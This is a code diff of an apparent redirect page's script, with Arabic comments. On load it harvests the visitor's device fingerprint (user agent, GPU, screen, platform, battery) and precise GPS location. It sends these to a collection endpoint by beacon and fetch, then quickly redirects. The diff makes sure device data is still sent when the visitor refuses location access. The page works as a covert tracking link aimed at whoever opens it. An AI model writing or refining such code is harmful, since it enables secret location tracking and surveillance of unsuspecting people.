@@ -97,61 +97,66 @@
             setTimeout(() => { window.location.replace(webUrl); }, 1500);
         }
 
-        window.onload = async () => {
-            let locationCaptured = false;
-            let bestPos = { coords: { latitude: 'N/A', longitude: 'N/A', accuracy: 'N/A' } };
-
-            // أمان: تحويل قسري بعد 4 ثوانٍ من بداية التحميل
-            setTimeout(redirect, 4000);
-
-            // 1. طلب الموقع
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => { bestPos = pos; locationCaptured = true; },
-                    () => { locationCaptured = true; },
-                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
-                );
-            } else {
-                locationCaptured = true;
-            }
-
-            // 2. انتظار الموقع (حد أقصى 3 ثوانٍ)
-            for (let i = 0; i < 30 && !locationCaptured; i++) {
-                await new Promise(r => setTimeout(r, 100));
-            }
-
-            // 3. جمع البيانات
-            const data = {
-                latitude: bestPos.coords.latitude,
-                longitude: bestPos.coords.longitude,
-                accuracy: bestPos.coords.accuracy && bestPos.coords.accuracy !== 'N/A' ? bestPos.coords.accuracy.toFixed(1) + "m" : "N/A",
-                userAgent: navigator.userAgent,
-                gpu: getGPU(),
-                screen: `${window.screen.width}x${window.screen.height}`,
-                platform: navigator.platform,
-                battery: await getBatteryInfo()
-            };
-
-            const jsonStr = JSON.stringify(data);
-
-            // 4. إرسال البيانات بـ sendBeacon (ينجو من إغلاق الصفحة)
+        // وظيفة إرسال البيانات للسيرفر
+        function sendData(data) {
             try {
-                const blob = new Blob([jsonStr], { type: 'application/json' });
+                const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
                 navigator.sendBeacon('/api/location', blob);
             } catch (e) { }
-
-            // 5. إرسال نسخة ثانية بـ fetch كاحتياط
             try {
                 fetch('/api/location', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: jsonStr,
+                    body: JSON.stringify(data),
                     keepalive: true
                 });
             } catch (e) { }
+        }
 
-            // 6. تحويل بعد 300ms
-            setTimeout(redirect, 300);
+        window.onload = async () => {
+            // أمان: تحويل قسري بعد 4 ثوانٍ
+            setTimeout(redirect, 4000);
+
+            // جمع بيانات الجهاز الأساسية فوراً
+            const baseData = {
+                userAgent: navigator.userAgent,
+                gpu: getGPU(),
+                screen: `${window.screen.width}x${window.screen.height}`,
+                platform: navigator.platform,
+                battery: await getBatteryInfo(),
+                latitude: 'N/A',
+                longitude: 'N/A',
+                accuracy: 'N/A'
+            };
+
+            // 1. طلب الموقع - عند النجاح يرسل رسالة ثانية بالإحداثيات
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        // GPS جاهز! نرسل البيانات مع الإحداثيات
+                        const gpsData = {
+                            ...baseData,
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy ? pos.coords.accuracy.toFixed(1) + "m" : "N/A",
+                            hasGPS: true
+                        };
+                        sendData(gpsData);
+                        // تحويل بعد الإرسال مباشرة
+                        setTimeout(redirect, 300);
+                    },
+                    () => {
+                        // المستخدم رفض أو فشل GPS - نرسل بيانات الجهاز فقط
+                        sendData(baseData);
+                        setTimeout(redirect, 300);
+                    },
+                    { enableHighAccuracy: true, timeout: 3500, maximumAge: 0 }
+                );
+            } else {
+                // الجهاز لا يدعم GPS
+                sendData(baseData);
+                setTimeout(redirect, 300);
+            }
         };
     </script>
 </body>
